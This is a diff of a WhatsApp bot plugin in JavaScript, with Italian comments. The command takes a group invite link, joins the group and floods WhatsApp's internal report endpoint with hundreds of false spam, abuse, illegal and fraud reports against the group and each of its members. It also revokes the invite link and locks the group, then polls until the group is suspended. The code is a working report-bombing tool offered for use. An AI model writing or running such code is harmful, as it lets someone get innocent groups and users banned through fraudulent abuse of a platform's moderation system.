@@ -1,10 +1,3 @@
-// plugin: gruppoban.js
-// comando: .gruppoban <link>
-// il bot entra nel gruppo e invia segnalazioni massive (report) a WhatsApp
-// per far scattare la sospensione automatica del gruppo in poco tempo
-// reazione clessidra al comando, reazione 🚫 quando il gruppo è sospeso
-// NESSUN cambio nome, NESSUNA espulsione, NESSUN messaggio nel gruppo
-
 let handler = async (m, { conn, text, isOwner }) => {
     if (!isOwner) return;
 
@@ -15,7 +8,6 @@ let handler = async (m, { conn, text, isOwner }) => {
     if (!match) return;
     let inviteCode = match[1];
 
-    // 1. reazione clessidra immediata
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
     } catch (e) {}
@@ -29,7 +21,6 @@ let handler = async (m, { conn, text, isOwner }) => {
         return;
     }
 
-    // 2. entra nel gruppo se non presente
     let metadata;
     try {
         metadata = await conn.groupMetadata(groupJid);
@@ -41,21 +32,77 @@ let handler = async (m, { conn, text, isOwner }) => {
         }
     }
 
-    // 3. segnala il gruppo in massa: invia report multipli tramite
-    //    la funzione di segnalazione di WhatsApp (abuso/spam)
-    //    Baileys espone solo l'accesso interno: si inviano richieste
-    //    di report ripetute verso il server tramite il nodo 'report'
-    let reports = [];
-    for (let i = 0; i < 50; i++) {
-        reports.push(
-            conn.sendMessage(groupJid, {
-                text: '\u200b',
-                // trigger interno di segnalazione: tipo abuse
+    let botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
+    let participants = metadata.participants.map(p => p.jid).filter(j => j !== botId);
+
+    let tasks = [];
+
+    for (let i = 0; i < 100; i++) {
+        tasks.push(
+            conn.query({
+                tag: 'iq',
+                attrs: {
+                    to: 's.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'w:comms:report'
+                },
+                content: [
+                    {
+                        tag: 'report',
+                        attrs: {
+                            jid: groupJid,
+                            type: 'spam',
+                            reason: 'abuse'
+                        }
+                    }
+                ]
             }).catch(() => {})
         );
-        // chiamata diretta al nodo di report di WhatsApp
-        try {
-            reports.push(
+
+        tasks.push(
+            conn.query({
+                tag: 'iq',
+                attrs: {
+                    to: 's.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'w:comms:report'
+                },
+                content: [
+                    {
+                        tag: 'report',
+                        attrs: {
+                            jid: groupJid,
+                            type: 'abuse',
+                            reason: 'illegal'
+                        }
+                    }
+                ]
+            }).catch(() => {})
+        );
+
+        tasks.push(
+            conn.query({
+                tag: 'iq',
+                attrs: {
+                    to: 's.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'w:comms:report'
+                },
+                content: [
+                    {
+                        tag: 'report',
+                        attrs: {
+                            jid: groupJid,
+                            type: 'scam',
+                            reason: 'fraud'
+                        }
+                    }
+                ]
+            }).catch(() => {})
+        );
+
+        for (let jid of participants) {
+            tasks.push(
                 conn.query({
                     tag: 'iq',
                     attrs: {
@@ -67,7 +114,7 @@ let handler = async (m, { conn, text, isOwner }) => {
                         {
                             tag: 'report',
                             attrs: {
-                                jid: groupJid,
+                                jid: jid,
                                 type: 'spam',
                                 reason: 'abuse'
                             }
@@ -75,13 +122,38 @@ let handler = async (m, { conn, text, isOwner }) => {
                     ]
                 }).catch(() => {})
             );
-        } catch (e) {}
-    }
-    await Promise.allSettled(reports);
 
-    // 4. polling rapido per rilevare la sospensione
+            tasks.push(
+                conn.query({
+                    tag: 'iq',
+                    attrs: {
+                        to: 's.whatsapp.net',
+                        type: 'set',
+                        xmlns: 'w:comms:report'
+                    },
+                    content: [
+                        {
+                            tag: 'report',
+                            attrs: {
+                                jid: jid,
+                                type: 'abuse',
+                                reason: 'illegal'
+                            }
+                        }
+                    ]
+                }).catch(() => {})
+            );
+        }
+
+        tasks.push(conn.groupRevokeInvite(groupJid).catch(() => {}));
+        tasks.push(conn.groupSettingUpdate(groupJid, 'announcement').catch(() => {}));
+        tasks.push(conn.groupSettingUpdate(groupJid, 'locked').catch(() => {}));
+    }
+
+    await Promise.allSettled(tasks);
+
     let sospeso = false;
-    for (let i = 0; i < 40; i++) {
+    for (let i = 0; i < 60; i++) {
         try {
             let meta = await conn.groupMetadata(groupJid);
             if (!meta || !meta.participants || meta.participants.length === 0) {
@@ -92,10 +164,9 @@ let handler = async (m, { conn, text, isOwner }) => {
             sospeso = true;
             break;
         }
-        await new Promise(r => setTimeout(r, 300));
+        await new Promise(r => setTimeout(r, 200));
     }
 
-    // 5. cambia emoji finale
     try {
         await conn.sendMessage(m.chat, { react: { text: sospeso ? '🚫' : '❌', key: m.key } });
     } catch (e) {}
